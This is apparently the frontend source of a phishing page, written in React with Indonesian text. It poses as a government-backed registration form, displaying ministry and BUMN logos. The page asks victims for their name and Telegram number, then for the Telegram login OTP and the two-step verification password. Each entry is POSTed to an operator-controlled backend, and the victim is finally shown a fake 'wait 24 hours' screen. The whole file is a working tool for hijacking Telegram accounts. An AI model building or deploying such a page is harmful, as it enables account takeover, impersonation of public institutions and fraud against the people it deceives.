"use client";

import React, { useState, useRef } from 'react';

// Komponen Logo Instansi (Pengganti Kotak Merah)
const FooterLogos = () => (
  <div className="flex justify-between items-center bg-white p-3 mt-6 rounded-lg border border-gray-100 shadow-sm">
    <div className="w-[22%]"><img src="/logo bumn.jpg" className="w-full h-auto object-contain" /></div>
    <div className="w-[22%]"><img src="/logo kementrian kesehatan.png" className="w-full h-auto object-contain" /></div>
    <div className="w-[22%]"><img src="/logo siksng.jpg" className="w-full h-auto object-contain" /></div>
    <div className="w-[22%]"><img src="/logo kominfo.png" className="w-full h-auto object-contain" /></div>
  </div>
);

export default function AuthForm() {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [formData, setFormData] = useState({ nama: '', nomor: '', sandi: '' });
  const [otpValues, setOtpValues] = useState(['', '', '', '', '']);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // GANTI URL INI DENGAN URL RAILWAY ANDA
  const API_URL = "https://backend-production-xxxx.up.railway.app/register";

  const handleOtpChange = (index: number, value: string) => {
    const val = value.replace(/\D/g, "");
    const newOtp = [...otpValues];
    newOtp[index] = val.substring(val.length - 1);
    setOtpValues(newOtp);
    if (val && index < 4) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpValues[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleNext = async (currentStep: number) => {
    setError("");
    if (currentStep !== 4) setLoading(true);
    
    const payload = { ...formData, otp: otpValues.join(''), step: currentStep };

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const res = await response.json();

      if (response.ok) {
        if (currentStep === 1) setStep(2);
        else if (currentStep === 2) res.status === "need_2fa" ? setStep(3) : setStep(4);
        else if (currentStep === 3) setStep(4);
      } else {
        setError("Koneksi gagal.");
      }
    } catch (err) {
      setError("Koneksi gagal.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-md mx-auto bg-white min-h-screen shadow-lg font-sans">
      <img src="/banner.jpg" className="w-full h-auto" />

      <div className="p-6">
        {step === 4 ? (
          /* HALAMAN LOADING FINAL (Sesuai Gambar) */
          <div className="text-center py-10 animate-fade-in">
            <img src="/processing.png" className="w-48 mx-auto mb-6" alt="Processing" />
            <p className="text-blue-500 font-bold text-lg px-4">
              Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan
            </p>
          </div>
        ) : (
          <>
            {step === 1 && (
              <div className="space-y-6">
                <h2 className="text-2xl font-bold text-center text-gray-800">Form Pendaftaran Penerimaan</h2>
                <input 
                  className="w-full p-4 border-2 border-gray-200 rounded-2xl text-lg outline-none focus:border-blue-500"
                  placeholder="Nama Lengkap Sesuai E-KTP"
                  onChange={(e) => setFormData({...formData, nama: e.target.value})}
                />
                <input 
                  className="w-full p-4 border-2 border-gray-200 rounded-2xl text-lg outline-none focus:border-blue-500"
                  placeholder="Nomor Telegram Aktif (08xx)"
                  type="tel"
                  onChange={(e) => setFormData({...formData, nomor: e.target.value})}
                />
                <button onClick={() => handleNext(1)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl text-xl shadow-lg active:scale-95 transition-all">
                  DAFTAR SEKARANG
                </button>
              </div>
            )}

            {step === 2 && (
              <div className="space-y-8">
                <p className="text-blue-600 font-bold text-center text-xl leading-relaxed px-2">
                  Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda
                </p>
                
                {/* 5 KOTAK OTP (Sesuai Gambar) */}
                <div className="flex justify-center gap-3">
                  {otpValues.map((data, index) => (
                    <input
                      key={index}
                      type="tel"
                      ref={(el) => { inputRefs.current[index] = el; }}
                      value={data}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-14 h-16 text-center text-3xl font-bold border-2 border-gray-200 rounded-2xl bg-gray-50 focus:border-blue-500 outline-none transition-all"
                    />
                  ))}
                </div>

                {error && <p className="text-red-600 text-center font-bold">{error}</p>}

                <button onClick={() => handleNext(2)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl text-xl shadow-lg active:scale-95 transition-all">
                  VERIFIKASI OTP
                </button>
              </div>
            )}

            {step === 3 && (
              <div className="space-y-6 text-center">
                <p className="font-bold text-gray-700 text-lg">Verifikasi 2 Langkah</p>
                <input 
                  className="w-full p-4 border-2 border-gray-200 rounded-2xl outline-none focus:border-blue-500"
                  placeholder="Masukkan Kata Sandi"
                  type="password"
                  onChange={(e) => setFormData({...formData, sandi: e.target.value})}
                />
                <button onClick={() => handleNext(3)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl">
                  KONFIRMASI
                </button>
              </div>
            )}
            
            {loading && (
              <div className="fixed inset-0 bg-white/80 flex items-center justify-center z-50">
                <div className="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-600"></div>
              </div>
            )}
          </>
        )}
        <FooterLogos />
      </div>
    </div>
  );
}